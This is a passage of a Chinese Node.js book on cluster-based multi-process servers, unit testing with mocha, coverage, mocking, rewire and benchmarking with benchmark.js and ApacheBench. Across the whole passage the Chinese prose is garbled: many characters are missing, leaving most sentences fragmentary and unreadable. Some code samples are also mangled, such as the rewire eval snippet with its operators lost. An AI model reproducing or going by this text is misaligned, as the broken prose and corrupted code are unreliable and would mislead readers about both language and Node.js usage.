这在问题的是有可能我们的接是接，不是 HTTP 服务的这接，接开可能要的时。为为已有接的开一个时时是要的，在定时强
的下
process.on('uncaughtException', function (err) { process.send({act: 'suicide'}); // 接收的接 worker.close(function () {
//有有接开出进程
process.exit(1); }); // 5 出进程 setTimeout(function () {
process.exit(1); }, 5000); });
程中能的，就着有一在性上是不的。为程前，过下问题在是要做的事情，它可以我们很好定的，下
process.on('uncaughtException', function (err) { // 录日志 logger.error(err); // 发自信 process.send({act: 'suicide'}); // 接收的接 worker.close(function () {
//有有接开出进程
process.exit(1); }); // 5 出进程 setTimeout(function () {
process.exit(1); }, 5000); });

2.

过自信程可以使新接是有程服务，是还是有极端的情。工作程不能，动的过程中就发生了，者动后接到接就收到，9 会工作程，这不于我们的情，因为这时内已经不的，极有可能是程序编写的。
为了这的，在一定的下，不应反复。在时内定只能多次，过就触发 giveup 事，工作程这个要事。为了量的统，我们入一个做，在次工作程之并是否过，下
//重启数 var limit = 10;
//时间单位 var during = 60000; var restart = []; var isTooFrequently = function () {
// 录重启时间 var time = Date.now(); var length = restart.push(time); if (length > limit) {
//出 10 录
restart = restart.slice(limit \* -1); } // 重启前 10 重启间的时间间 return restart.length >= limit && restart[restart.length - 1] -restart[0] < during;
};
var workers = {};
var createWorker = function () { // 检查是否过 if (isTooFrequently()) {
//发 giveup 事件不重启 process.emit('giveup', length, during); return;
} var worker = fork(\_\_dirname + '/worker.js'); worker.on('exit', function () {
console.log('Worker ' + worker.pid + ' exited.');
delete workers[worker.pid]; }); // 重启动的进程 worker.on('message', function (message) {
if (message.act === 'suicide') { createWorker();
} }); // 句柄转发 worker.send('server', server); workers[worker.pid] = worker; console.log('Create worker. pid: ' + worker.pid);
};
giveup 事是 uncaughtException 的事。uncaughtException 只中个工作程，在性下，不会用不到服务的情，是这个 giveup 事中没有程服务了，分。为了性，我们应在 giveup 事中加要，并系统到这个，。
9.3.3
在多程之相的端，使用请能分到多个程上，这的好
是可以 CPU 源都用起。这客人的分发多个作。多个有，个的工作量是一门学问，不能一些不过，也不能一些着，这多个工作量的。
Node 认的机是用作系统的。的就是在一工作程中，着的程对到的请，到服务。
一言，这对大是的，个程可以自己的。是对于 Node 言，要分的是它的是由 CPU、I/O 个部分的，的是 CPU 的。对不的务，可能在 I/O，CPU 为的情，这可能个程能到多请，不的情。
为 Node 在 v0.11 中了一新的使，这新的 Round-Robin，。的工作是由程接接，次分发工作程。分发的是在 N 个工作程中，次 i = (i+ 1) mod n 个程发接。在 cluster 中用它的下
//启用 Round-Robin cluster.schedulingPolicy = cluster.SCHED_RR //不启用 Round-Robin cluster.schedulingPolicy = cluster.SCHED_NONE
者在环境量中 NODE_CLUSTER_SCHED_POLICY 的，下
export NODE_CLUSTER_SCHED_POLICY=rr export NODE_CLUSTER_SCHED_POLICY=none
Round-Robin，可以 CPUI/O 的不。Round-Robin 也可以过服务实，是它会服务上的是的。
9.3.4
在 5 中，我们到在 Node 程中不多数，因为它会加收的，性能。时，Node 也不在多个程之享数。在实的务中，要享一些数，数，这在多个程中应是一的。为，在不享数的情下，我们要一机实数在多个程之的享。

1.

解决数享最接、的就是过数，数到数、、服务（Redis）中，有工作程动时读内中。这在的问题是数发生，还要一机到个程，使它们的内部也到新。
实的机有，一是个程定时，图图 9-10。
定时的问题是时不能过，程过多，会并发，数没有发生，这些会没有，加的开。时过，数发生
时，不能时新到程中，会有一定的。

图 9-10 定时图

2.

一的是数发生新时，动程。，使是动，也要一机时数的。这个过程不能，我们可以的程数量，我们这用发是否的程做程。为了不务，可以这个程为只，不务，图图 9-11。

图 9-11 动图
这推机程信，在多服务时会，是可以用 TCPUDP 的。程在动时从服务了读一次数外，还程信到服务。一过发有数新后，信，新后的数发工作程。由于不多程一，应的不至于过大，一的服务的并不大，以可以时，一发新，就能实时推到个程中。

## 9.4 Cluster 模块

前了 child_process 中的大多数，以过这个强大的机。熟 Node，也你会为不 cluster。上的问题，Node 在 v0.8 本时新的 cluster 就能解决。在 v0.8 本之前，实多程过 child_process 实，要创机 Node，由于有这多要，对工程言是一相对的工作，于是 v0.8 时接入了 cluster，用以解决多 CPU 的用问题，时也了的 API，用以程的性问题。
对于本开到的创 Node 程，cluster 实起也是很的事情，下
// cluster.js var cluster = require('cluster');
cluster.setupMaster({ exec: "worker.js" });
var cpus = require('os').cpus(); for (var i = 0; i < cpus.length; i++) { cluster.fork(); }
node cluster.js 会到与前创程的相。就的言，它喜欢下的作为
var cluster = require('cluster'); var http = require('http'); var numCPUs = require('os').cpus().length;
if (cluster.isMaster) { // Fork workers for (var i = 0; i < numCPUs; i++) {
cluster.fork(); }
cluster.on('exit', function(worker, code, signal) { console.log('worker ' + worker.process.pid + ' died'); }); } else { // Workers can share any TCP connection
// In this case its a HTTP server
http.createServer(function(req, res) { res.writeHead(200); res.end("hello world\n");
}).listen(8000); }
在程中是程还是工作程，要决于环境量中是否有 NODE_UNIQUE_ID，下
cluster.isWorker = ('NODE_UNIQUE_ID' in process.env); cluster.isMaster = (cluster.isWorker === false);
是中 cluster.isMaster、cluster.isWorker，对于的可读性分。我用 cluster.setupMaster()这个 API，程工作程从上，send()起接服务从程发到程样，之后，甚至都不到程中有服务相关的。
过 cluster.setupMaster()创程不是使用 cluster.fork()，程序不，分，的可读性可性好。
9.4.1Cluster
事实上 cluster 就是 child_processnet 的组应用。cluster 动时，我们在
9.2.3 的一样，它会在内部动 TCP 服务，在 cluster.fork()程时，这个 TCP 服务端 socket 的发工作程。程是过 cluster.fork()复的，它的环境量就在 NODE_UNIQUE_ID，工作程中在 listen()网端的用，它到，过 SO_REUSEADDR 端用，从实多个程享端。对于动的程，不在享事情。
在 cluster 内部创 TCP 服务的对使用者分，也是这使它接使用 child_process 样灵活。在 cluster 应用中，一个程只能管一组工作程，图 9-12。

图 9-12 在 cluster 应用中，一个程只能管一组工作程
对于自过 child_process 作时，可以灵活工作程，甚至多组工作程。因在于自过 child_process 作程时，可以创多个 TCP 服务，使
程可以享多个的服务端 socket，图 9-13。

图 9-13 自过 child_process 多组工作程
9.4.2Cluster
对于性，cluster 也了相多的事。
. fork 复一个工作程后触发事。
. online 复好一个工作程后，工作程动发一 online 程，程收到后，触发事。

. listening 工作程中用 listen()（享了服务端 Socket）后，发一 listening 程，程收到后，触发事。
. disconnect 程工作程之 IPC 开后会触发事。
. exit 有工作程时触发事。
. setupcluster.setupMaster()后触发事。

这些事大多 child_process 的事相关，在程的上的。这些事对于强应用的性已经了。

## 9.5 总结

管 Node 从线程的它有的不能分用多 CPU 源，定性也到。是的量是强大的，过的从，就可以应用的质量一个次。在实的复杂务中，我们可能要动很多程务，甚至从复杂，是个程应是到只做好一事，后过程信技术它们接起可。这 Unix 的，个程只做一事，并做好一事，复杂分解为，组强大。
管过 child_process 可以大 Node 的定性，是一程问题，有程会管。在 Node 的程管之外，还要用程数量的个系统的定性，使程，也能时到，使开发者可以时。

## 9.6 参考资源

本章参考的资源如下：

- http://nodejs.org/docs/latest/api/child_process.html
- http://nodejs.org/docs/latest/api/cluster.html
- https://github.com/aleafs/pmProcess
- http://en.wikipedia.org/wiki/Inter-process_communication
- http://en.wikipedia.org/wiki/Pipeline_(Unix)
- http://www.w3.org/TR/workers/
- http://man7.org/linux/man-pages/man7/unix.7.html

# 第 10 章 测试

在使用 Node 实的目开发之前，我内心也分。管 JavaScript，相熟的后端语言言，Node 且是新学。甚至对于前端，因为样的因，JavaScript 的测试都分。Node 编写的在线产品，在上用前能否好的质量，我是心问的。
从最写的自己不着，定 bug 到于一程序的个，到后很实对自己产的，对自己的了解心了。从对问题时的动到动，测试在这个过程中起到了至关要的作用。
测试的在于，在用产的之前，开发者它，要的质量。这的是，JavaScript 开发者要，自己的，对自己产的。为自己的写测试用是一之有的，它能开发者到的为性能。
测试包测试、性能测试、测试能测试几个，本从 Node 实践的测试性能测试。

## 10.1 单元测试

测试在目中着的，是几质量的中入产最高的一。管在过的 JavaScript 开发中，绝大多数人都了这个环，今天 Node 的我们不不新这。
10.1.1
最初接触测试时，很多开发者都很，自己写的，自己写测试，这事的在有的了门的测试工程开发者测试。这一对自己写的不在的为是开发者对自己测试自己心，认为测试是一，小是是，10 为要实践。强实践，就写写，过关，这使开发者不测试，不自己的。门的测试工程开发者对测试人产生，不关心自己的测试。
这要的是，的。目开发的会目的产品，开发者写的是开发者自己的产品。要产品的质量，就应有相应的。对于开发者言，测试就是最本的一。开发者不自己测试，要对下问题。
(1) 测试工程是否可
这的问题有个。一个是测试工程是否熟悉 Node，不了解一个只凭过经对这个目测试，有可能为的为，这对质量的目。一个是，在人事动因，可能并不一定到开发者的，从使测试用的本高。
(2) 是否可信对于 Node 开源社区言（有 3 多），作为一个不的开发者，产的
测试都没有，使用者在时，内心也会过多个的问。
(3) 在产品过程中，继续质量
测试的在于个测试用的都是一可能的。API 时，测试用可以很好是否下。对于可能的入，一测试，都能它的。动后，可以过测试的动是否已定的。
对于上问题，你的是不关心，喜你，你的目只能时，甚至只是个产品。
一个对测试的是，要在目中测试，势会开发者的目。这个是定的，因为产品质可以经的产品，要多的。只是工程，自可以产。区在于后续的，因为有测试的质量，可以心加能。后者会入的之，补，开发者也
只想做新目，的目最后不可，者不。甚至到目下线时，灵复。测试只是在会多一定的本，这个本要于后深的入。至于是在入本还是在后入，只是还是的。
开测试之前，要的问题是的可测试性，它是能为编写测试的前。复杂的分，甚至像一样作一，要对它们测试，相大。一个就是为一写测试时，这有，这会为开发者心，这样的最要。好的测试是量的，写测试之是一个相的，的小的时候，也就着定，的可测试性好，甚至。
言，编写可测试有以下几个可以。
一一的多，为编写测试的时候就要多的入数，后推测它的。，一中包数的接，也包，
为它编写测试用就要时关数接数。好的是这解分，个一的，分测试数接数。
. 过对程序接后，我们可以对接测试，实的不为接编写的测试。
. 次分实上是一的一实。在 MVC 的应用中，就是的次分，不分个次，想这个入测试。过分之后，可以测试，。

对于开发者言，不仅要编写测试，还应编写可测试。
10.1.2
测试要包言、测试、测试用、测试、mock、续几个，由于 Node 的性，它还会加入测试有的测试这个部分。

1.

于 JavaScript 入门为，在开源社区中可以到多不测试的，甚至有的作者并不了解测试是事。开发者仅仅在 test.js 者 demo.js 到，这对想一使用的用会在心。以下为个开源的
var readOF = require("readof"); readOF.read(pic, target_path, function (error, data) { // do something });
对质量没有，这要源于以下。
没有对的测。入并不。这样的的是 It works 不是 Testing。可以并不
是没有问题的。对测，以认用是的，是最本的测试。就是测试中用最小是否的测。有对 Node 的源过研，会发 Node 中在着 assert 这个，以很多要都用了这个。言，上的解是
中 assertion 中的的式的的的的。中错误。
一言以之，言用于程序在时是否。JavaScript 的言最自于 10 CommonJS 的测试（http://wiki.commonjs.org/wiki/Unit_Testing/1.0），Node实了中的言部分。
下是 assert 的工作
var assert = require('assert'); assert.equal(Math.max(1, 100), 100);
一 assert.equal()不，会 AssertionError，个程序会。没有对做言的，都不是测试。没有测试的，都是不可信的。
在言中，我们定了以下几测。
. ok()是否为。
. equal()实与是否相。
. notEqual()实与是否不相。
. deepEqual()实与是否深相（对数组的是否相）。
. notDeepEqual()实与是否不深相。
. strictEqual()实与是否相（相于===）。
. notStrictEqual()实与是否不相（相于!==）。
. throws()是否。之外，Node 的 assert 还了下个言。
. doesNotThrow()是否没有。
. ifError()实是否为一个（null、undefined、0、''、false），实为，会。

目前，上的言大多都是于 assert 的，这包括的 should.js 言。

2.

前到言一，会个应用，这对于做大言时并不友好。用的做是，下的并继续，最后生测试。这些务的者就是测试。
测试用于为测试服务，它本并不与测试，要用于管测试用生测试，测试用的开发，高测试用的可性可读性，以一些性的工作。这我们要的优测试是 mocha，它自 Node 社区的开发者 TJ Holowaychuk。过 npm install mocha 可，在时加-g 可以为工。
.
我们测试用的不组织为测试，今的测试要有 TDD（测试驱动开发）BDD（为驱动开发），它们的下。
. TDD 关有能是否实，一个能都对应的测试用 BDD 关为是否，自下的。
. TDD 的于能书的 BDD 的接于自语言的习。

mocha 对于测试都有。下为测试的，BDD 的下
describe('Array', function(){ before(function(){ // ... });
describe('#indexOf()', function(){ it('should return -1 when not present', function(){ [1,2,3].indexOf(4).should.equal(-1); }); }); });
BDD 对测试用的组织要用 describeit 组织。describe 可以多的，到测试用时，用 it。外，它还 before、after、beforeEachafterEach 这 4 个，用于 describe 中测试用的、、收工作。beforeafter 分在入 describe 时触发，beforeEachafterEach 分在 describe 中一个测试用（it）前后触发。
BDD 的组织图图 10-1。

图 10-1 BDD 的组织图
TDD 的下
suite('Array', function(){ setup(function(){ // ... });
suite('#indexOf()', function(){ test('should return -1 when not present', function(){ assert.equal(-1, [1,2,3].indexOf(4)); }); }); });
TDD 对测试用的组织要用 suitetest。suite 也可以实多，测试用用 test。它的数仅包 setupteardown，对应 BDD 中的 beforeafter。TDD 的组织图图 10-2。

图 10-2 TDD 的组织图
.
作为测试，mocha 分灵活，它与言之并不，使的测试用可以用 assert 生，也可以用的言，should.js、expectchai。用个言，测试用后，测试是开发者质量管者都关的。
mocha 了相的，用 mocha --reporters 可有的
\$ mocha --reporters
dot - dot matrix doc - html documentation spec -hierarchical spec list json -single json object progress -progress bar list -spec-style listing tap - test-anything-protocol landing -unicode landing strip xunit -xunit reporter teamcity -teamcity ci support html-cov -HTML test coverage json-cov -JSON test coverage min - minimal reporter (great with --watch) json-stream -newline delimited json events markdown -markdown documentation (github flavour) nyan -nyan cat!
认的为 dot，他用的有 spec、json、html-cov。mocha -R <reporter>可用这些。json 因为用，多用于他程序，html-cov 用于可。图 10-3 是 spec 的。
有测试用，会到图 10-4 的。图 10-3 spec 的 mocha –help 可以到多的信了解使用它们。

图 10-4 有测试用时的

3.

还 2 中到的包包中定了测试在于 test 目中，在于 lib 目下。之外，想你的测试起，请在包（package.json）中加 10 相应的关系。由于 mocha 只在测试时要，以加到 devDependencies 可
"devDependencies": { "mocha": "\*" }

4.

测试的本能后，我们对测试用也有了的认了。，一个为者能要有的、多的测试用，一个测试用中包至一个言。下
describe('#indexOf()', function(){ it('should return -1 when not present', function(){ [1,2,3].indexOf(4).should.equal(-1); });
it('should return index when present', function(){ [1,2,3].indexOf(1).should.equal(0); [1,2,3].indexOf(2).should.equal(1); [1,2,3].indexOf(3).should.equal(2);
}); });
测试用最要过测试反测试测试对能的，这是最本的测试用。对于 Node 言，不仅有这样的用，还有时要关。
.
由于 Node 环境的性，用，这也了在测试的。在他编程语言中，Java、Ruby、Python，大多是的，以测试用本上只要包一些言可。是在 Node 中，的，并且不数时用，这我们在对用测试时，后续测试用的。
，mocha 解决了这个问题。以下为 fs 中 readFile 的测试用
it('fs.readFile should be ok', function (done) {
fs.readFile('file_path', 'utf-8', function (err, data) { should.not.exist(err); done();
}); });
在上中，测试用 it()接个数用题（title）数（fn）。过这个数的（fn.length）这个用是否是用，是用，在测试用时，会一个数 done()入为实，测试要动用这个数测试前测试用，后测试才下一个测试用的，这与 4 到的触发分。
.
测试的问题并不是言有，要在于数的时从。过上的，我们 done()在时。，done()一没有，会有的测试用于，这不是的。
mocha 有的测试用加了时，一个用的时过了时，会下一个时，后下一个测试用。下这个测试用因为 10 后才，测试为时
it('async test', function (done) { // 模执行的异步方法 setTimeout(done, 10000);
});
mocha 的认时时为 2000。一情下，过 mocha -t <ms>有用的时时。时时，可以在测试用 it 中用 this.timeout(ms)实对个用的，下
it('should take less than 500ms', function (done) { this.timeout(500); setTimeout(done, 300);
});
也可以在 describe 中用 this.timeout(ms)下前的有用
describe('a suite of tests', function(){ this.timeout(500); it('should take less than 500ms', function (done) {
setTimeout(done, 300); });
it('should take less than 500ms as well', function (done) { setTimeout(done, 200); }); });

5.

过不加测试用，会不的分不的情。是测试对的情，我们要的工。测试是测试中的一个要，它能括性的，也能统到的情。
对于下这
exports.parseAsync = function (input, callback) {
setTimeout(function () { var result; try {
result = JSON.parse(input); } catch (e) {
return callback(e); } callback(null, result);
}, 10); };
我们为加部分测试用，下
describe('parseAsync', function () { it('parseAsync should ok', function (done) { lib.parseAsync('{"name": "JacksonTian"}', function (err, data) { should.not.exist(err);
data.name.should.be.equal('JacksonTian'); done(); }); }); });
要探这个测试用对源的，要一工统一是否，这要的相关工是 jscover。过 npm install jscover -g 的可以。
你的这 CommonJS 并且在 lib 目下，用 jscover lib lib-cov 源的编。jscover 会 lib 目下的.js 编到 lib-cov 目下，你会到下的
_\$jscoverage['index.js'][31]++;
exports.parseAsync = function(input, callback) { _$jscoverage['index.js'][32]++; setTimeout(function() { _$jscoverage['index.js'][33]++; var result; _\$jscoverage['index.js'][34]++; try {
_$jscoverage['index.js'][35]++; 
 result = JSON.parse(input); } catch (e) { _$jscoverage['index.js'][37]++; return callback(e);
} _\$jscoverage['index.js'][39]++; callback(null, result);
}, 10); };
我们到，一始的前都有一些_\$jscoverage 的，它们会在时统一了多次，也了统是否外，还能统次数。在测试时，我们过 require 入 lib 目下的测试。是为了到测试，在测试用时编之后的。为了区分这入始的区，我们在的入（是包目下的 index.js）中要做的区，下
module.exports = process.env.LIB_COV ? require('./lib-cov/index') : require('./lib/index');
在测试时，会一个 LIB_COV 的环境量，以区分测试环境环境。编好的之后，以下可到的
//设置当前命行有的量 export LIB_COV=1 mocha -R html-cov > coverage.html
这个程的图图 10-5。

图 10-5 程图
在这次测试中，我们用到了 html-cov，它我们生了一 HTML 页，了一到，为多。图 10-6 为页图，从中可以到有一没有测试到。

图 10-6 测试
测试我们定没有测试到的。，我们会不经一些情的。一个的入可以情，下我们为补测试用
it('parseAsync should throw err', function (done) {
lib.parseAsync('{"name": "JacksonTian"}}', function (err, data) { should.exist(err); done();
}); });
次测试用，我们到一个 100%的页，图 10-7。

图 10-7 100%的页
在使用过程中，也可以使用 json-cov，这样数对余系统为友好。事实上，html-cov 是用 json-cov 的数与的。jscover 已经用，是还有个问题。
它的编部分是过 Java 实的，这样环境上就多了 Java。
它要编到一个外的新目，这个过程相对。blanket 解决了这个问题，它由 JavaScript 实，编的过程也是的，外的目，对于目没有外的入。
blanket 与 jscover 的本一，在实过程上有不，在于 blanket 编的入在 require 中，不是外编，测试时用编后的，它的技在 require 中。
它的 jscover 要，只要在有测试用之前过--require 入它可
mocha --require blanket -R html-cov > coverage.html
一个要的是，在包中 scripts。在 scripts 中，pattern 性用以要编的
"scripts": { "blanket": { "pattern": "eventproxy/lib" } },
在测试中过 require 入一个时，它这个的实，这个，就对它编。它的编与 jscover 不，jscover 要编到上的一个目 lib-cov 中。是 blanket 不，它的与 2 中到的编相。我们，对于.js，Node 会它的编在 require.extensions['.js']中。blanket 是在这个环中实了编，的入到始中，后由始，图图 10-8。

图 10-8 blanket 的编程
使用 blanket 之后，就环境量了，也环境入，以下这就不要了
module.exports = process.env.LIB_COV ? require('./lib-cov/index') : require('./lib/index');

6. mock
   前到开发者会一些，中相大一部分因在于的情实。大多与入数并绝对的关系，数的用，了入外，还有可能是网、入数相关的情，这相对以。
   在测试，实是一个不小的目，它有着一个的 mock。我们过用测试上的性。
   以下的为，系统的是绝对不的，为了测试的性程上的，本高
   exports.getContent = function (filename) { try { return fs.readFileSync(filename, 'utf-8'); } catch (e) { return ''; } };
   为了解决这个问题，我们过 fs.readFileSync()触发。时为了测试用不余用，我们要在后还它。为，前到的 before()after()10 数上了用场，相关下
   describe("getContent", function () {
   var \_readFileSync;
   before(function () {
   \_readFileSync = fs.readFileSync; fs.readFileSync = function (filename, encoding) { throw new Error("mock readFileSync error"));
   }; }); // it(); after(function () {
   fs.readFileSync = \_readFileSync; }) });
   我们在测试用前用，后还它。个测试用前后都要还，就使用 beforeEach()afterEach()这个数。由于 mock 的过程，这推荐一个解决事 muk，下
   var fs = require('fs'); var muk = require('muk'); before(function () {
   muk(fs, 'readFileSync', function(path, encoding) { throw new Error("mock readFileSync error"); }); });
   // it();
   after(function () { muk.restore(); });
   有多个用时，相关下
   var fs = require('fs'); var muk = require('muk'); beforeEach(function () {
   muk(fs, 'readFileSync', function(path, encoding) { throw new Error("mock readFileSync error"); }); });
   // it(); // it();
   afterEach(function () { muk.restore(); });
   时时用，用后用 muk.restore()复可。
   过的情，在只要测用的是否可，关是否是的。可以很大程开发者的性，用的能。
   的一是，对于的，要分小心是否为。下的 mock 可能会起外的
   fs.readFile = function (filename, encoding, callback) { callback(new Error("mock readFile error")); };
   的 mock 是量 mock 后的为与始为一，相关下
   fs.readFile = function (filename, encoding, callback) { process.nextTick(function () { callback(new Error("mock readFile error")); }); };
   时，我们用 process.nextTick()使能可。关于 process.nextTick()的，3 中有，不做多解。
7.

对于 Node 言，一个会在测试的过程中，就是有的测试，这在 2 中过。只有在 exportsmodule.exports 上的量才可以外部过 require 入问，余只能在内部用问。
在 Java 一的语言，有的问可以过反的实。，Node 实是否可以因为它们是有就不用为它们加测试
是否定的，为了应用的性，我们应可能加测试用。了这些有过 exports 外，还有的是定的。rewire 了一的实对有的问。
rewire 的用与 require 分。对于下的有，我们它并为测试用
var limit = function (num) { return num < 0 ? 0 : num; };
测试用下
it('limit should return success', function () { var lib = rewire('../lib/index.js'); var litmit = lib.**get**('limit'); litmit(10).should.be.equal(10);
});
rewire 的在于它入时，像 require 一样对始做了一定的脚。了加(function(exports, require, module, **filename, **dirname) {});的包外，它还入了部分，下
(function (exports, require, module, **filename, **dirname) { var method = function () {}; exports.**set** = function (name, value) {
eval(name " = " value.toString()); }; exports.**get** = function (name){
return eval(name); }; });
一个 rewire 入的都有**set**()**get**()。它用了包的，在 eval()时，实了对内部部量的问，从可以部量测试用用。
10.1.3
Node 以的都相对，在开发目时，还要一定的工实工程自动（这我们中的一续），以工本。

1.

Node 在*nix 系统下可以很好用一些熟工，中 Makefile 小灵活，用工程。下是我用的 Makefile 的内
TESTS = test/*.js REPORTER = spec TIMEOUT = 10000 MOCHA_OPTS =
test:
@NODE_ENV=test ./node_modules/mocha/bin/mocha \ --reporter $(REPORTER) \ --timeout $(TIMEOUT) \ $(MOCHA_OPTS) \ $(TESTS)
test-cov: @\$(MAKE) test MOCHA_OPTS='--require blanket' REPORTER=html-cov > coverage.html
test-all: test test-cov
.PHONY: test 开发者动之后，只过 make testmake test-cov 可复杂的测试。这要以下。
. Makefile 的是 tab，不能用。
在包中 blanket。

2.

目工程可以我们目组织定的，以。是对于实的目言，是的，本的信，还要一个续的环境。至于续，个都有自己定的，这一下社区中的用 travis-ci 实续。travis-ci 与 GitHub 的可相。GitHub 了托管社编程的好环境，程序们可以在上很社的 clone、fork、pull request、issues 作，travis-ci
补了 GitHub 在续的。Git 本系统了 hook 机，用在 push 后会触发一个 hook 脚本，travis-ci 是过这与 GitHub 接起的。你的与 travis-ci 接起分，只下几可。
(1) 在https://travis-ci.org/上过OAuth定你的GitHub。
(2) 在 GitHub 的管（admin）中开 services hook 页，在这个页中可以发 GitHub 上了很多于 git hook 的服务。
(3) 到 travis 服务，活可。(4) 次 push 到 GitHub 的上后，会触发服务。之外，一定了 GitHub 之后，也可以过 travis-ci 的管些开
续服务。
travis-ci 了的语言时环境外，还数服务、、，分强大，深用。要的一是，travis-ci 是于 Ruby 创的目，最开始是为 Ruby 目服务的，目前了多后端语言的测试续服务，是它会目认做 Ruby 目。为了解决问题，要在自己的目中一个.travis.yml，之 travis-ci 是的目。Node 目的下
language: node_js
node_js:

- "0.8"
- "0.10"
  中要有个，language 的本。travis-ci 在收到 GitHub 的后，会 pull 最新的到测试机中，并对应的环境本。还 2 中到的 scripts 前 blanket 的就在这个上。这 travis-ci 会 npm test 动个测试，前到的 mocha -R specmake test 应在 package.json 中
  "scripts": {
  "test": "make test"
  },
  travis-ci 了一个测试的服务。在 GitHub 上，也会经到的图者的图
  。它就是由 travis-ci 的目服务，由下组
  https://travis-ci.org/<username>/<repo>.png?branch=<branch>
  图能实时反目的测试。passing 的图能在使用者研时加使用前的信心。
  travis-ci 了服务外，还了次测试的，过这些信我们可以目的。
  10.1.4
  在这一中，我们了的测试的，对于一些定场景下的测试
  并做过多，测试 Web 应用，读者可以自用 Web 的测试，Connect Express 了 supertest 测试的编写。
  在目中经会因为的产生务的动，没有测试的，发生后，很定动的。一为目的测试，目的会因为测试了于心。的测试在一定程上也着目的熟。

## 10.2 性能测试

测试要用于测的为是否。在的为测后，还要对已有的性能作，测已有能是否能生产环境的性能要，能否实务的。，性能也是能。
性能测试的广，包括测试、测试测试。由于这部分内并 Node 有，为了收，这只会下测试。了测试，这还对 Web 应用网的性能测试务的。
10.2.1
本上，个开发者都为自己的写测试的能。测试要统的就是在多时内了多次个。为了强可性，一会以次数作为，后时，以性能的。
我们要测试 ECMAScript5 的 Array.prototype.map 环，它们都是一个数组，数的到一个新的数组，相关下
var nativeMap = function (arr, callback) { return arr.map(callback); };
var customMap = function (arr, callback) { var ret = []; for (var i = 0; i < arr.length; i++) {

ret.push(callback(arr[i], i, arr)); } return ret;
};
接的就是相的入数，后相的次数，最后时。为我们可以写一个这个务，下
var run = function (name, times, fn, arr, callback) { var start = (new Date()).getTime(); for (var i =0;i < times; i++) {
fn(arr, callback); }
var end = (new Date()).getTime(); console.log('Running s d times cost %d ms', name, times, end -start);
%%
};
最后，分用 1 000000 次
var callback = function (item) { return item; };
run('nativeMap', 1000000, nativeMap, [0, 1, 2, 3, 5, 6], callback); run('customMap', 1000000, customMap, [0, 1, 2, 3, 5, 6], callback);
到的下
Running nativeMap 1000000 times cost 873 ms Running customMap 1000000 times cost 122 ms
在我的机上测试 Array.prototype.map 相的务，要 for 环 7 的时。上就是测试的本。为了到好的，这 benchmark 这个是组织测试的，相关下
var Benchmark = require('benchmark');
var suite = new Benchmark.Suite();
var arr = [0, 1, 2, 3, 5, 6]; suite.add('nativeMap', function () { return arr.map(callback);
}).add('customMap', function () { var ret = []; for (var i = 0; i < arr.length; i++) {
ret.push(callback(arr[i])); } return ret;
}).on('cycle', function (event) { console.log(String(event.target)); }).on('complete', function() { console.log('Fastest is ' + this.filter('fastest').pluck('name')); }).run();
它过 suite 组织组测试，在测试中用 add()加测试的。上，到的下
nativeMap x 1,227,341 ops/sec ±1.99% (83 runs sampled) customMap x 7,919,649 ops/sec ±0.57%(96 runs sampled) Fastest is customMap
benchmark 的与我们用测试多 ±1.99%(83 runs sampled) 这一 10 。事实上，benchmark 并不是统多次测试后对时，它对测试有着的样过程。多次决于样到的数能否统。83 runs sampled 对 nativeMap 测试的过程中，有 83 个样本，后我们这些样本，可以推，±1.99%这部分数。
10.2.2
了可以对本的测试外，还会对网接测试以网接的性能，这在 6.4 过。对网接做测试要的几个有、应时并发数，这些反了服务的并发能。
最用的工是 ab、siege、http_load，下我们过 ab 工测试，相关下
$ ab -c 10 -t 3 http://localhost:8001/ This is ApacheBench, Version 2.3 <$Revision: 655654 \$> Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/ Licensed to The Apache Software Foundation, http://www.apache.org/
Benchmarking localhost (be patient) Completed 5000 requests Completed 10000 requests Finished 11573 requests
Server Software: Server Hostname: localhost Server Port: 8001
Document Path: / Document Length: 10240 bytes
Concurrency Level: 10 Time taken for tests: 3.000 seconds Complete requests: 11573 Failed requests: 0 Write errors: 0 Total transferred: 119375495 bytes HTML transferred: 118507520 bytes Requests per second: 3857.60 [#/sec](mean) Time per request: 2.592 [ms](mean) Time per request: 0.259 [ms] (mean, across all concurrent requests) Transfer rate: 38858.59 [Kbytes/sec] received
Connection Times (ms)
min mean[+/-sd] median max Connect: 0 0 0.3 0 31 Processing: 1 2 1.9 2 35 Waiting: 0 2 1.9 2 35 Total: 1 3 2.0 235
Percentage of the requests served within a certain time (ms) 50 % 2 66 % 3 75 % 3 80 % 3 90 %3
95 % 3 98 % 5 99 %6
100% 35 (longes t request)
上 10 个并发用续 3 服务端发请。下要上中个数的。
. Document Path 的，为/。
. Document Length 的，就是的大小，这有 10KB。
. Concurrency Level 并发，就是我们在中入的 c，为 10，10 个并发。
. Time taken for tests 有测试的时，它与中入的 t 有入。
. Complete requests 在这次测试中一多次请。
. Failed requests 中产生的请数，这次测试中没有的请。
. Write errors 在写入过程中的次数（接开的）。
. Total transferred 有的大小。
. HTML transferred 仅 HTTP 的大小，它上一个小。
. Requests per second 这是我们关的一个，它服务能多请，是反服务并发能的。这个 RPSQPS。
个 Time per request 一个的是用时，个的是服务请事，前者以并发数到后者。
. Transfer rate，于的大小以时，这个网的。
. Connection Times 接时，它包括客端服务端立接、服务端请、应的过程。最后的数是请的应时分，这个数是 Time per request 的实分。可以到，

50%的请都在 2ms 内，99%的请都在 6ms 内。外，要的是，上测试是在我的本上的，我的本的相关下 2.4GHz IntelCorei5 内 8GB1333 MHz DDR3
10.2.3
Felix Geisend.rfer 是 Node 的一个贡献者，时也是一些优的作者，中最的为他的几个 MySQL 驱动，以性能。他在 Faster than C 中到了一他使用的开发，也是 BDD，为 BenchmarkDrivenDevelopment，测试驱动开发，10 中要分为下几程图图 10-9。
(1) 写测试。
(2) 写/。(3) 收数。

(4) 问题。(5)到(2)。

图 10-9 测试驱动开发的程图
之前测试的服务端脚本在个 CPU 上，为了 cluster 是否有，我们可以 Felix Geisend.rfer 的。过上的测试，我们已经了一遍上程。接下，我们到(2)，是否有性能的。
始，下我们新一个 cluster.js，用于机上的 CPU 数量动多程服务，相关下
var cluster = require('cluster');
cluster.setupMaster({ exec: "server.js" });
var cpus = require('os').cpus(); for (var i = 0; i < cpus.length; i++) {
cluster.fork(); } console.log('start ' + cpus.length + ' workers.');
接着过下动新的服务
node cluster.js start 4 workers.
后用相的数测试，动多个程是否是之有的。测试下
$ ab -c 10 -t 3 http://localhost:8001/ This is ApacheBench, Version 2.3 <$Revision: 655654 \$> Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/ Licensed to The Apache Software Foundation, http://www.apache.org/
